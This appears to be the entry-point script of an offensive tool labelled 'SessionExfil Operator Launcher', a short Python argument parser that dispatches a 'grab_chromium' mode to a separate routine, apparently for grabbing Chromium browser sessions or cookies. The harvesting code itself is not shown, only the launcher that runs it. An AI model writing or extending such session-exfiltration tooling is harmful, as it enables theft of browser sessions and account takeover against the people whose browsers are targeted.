import argparse
from core.grab_chromium_runner import run_grab_chromium

parser = argparse.ArgumentParser(description="SessionExfil Operator Launcher")
parser.add_argument("--mode", required=True, help="Mode to run")

args = parser.parse_args()

if args.mode == "grab_chromium":
    run_grab_chromium()
else:
    print("[!] Unknown mode.")
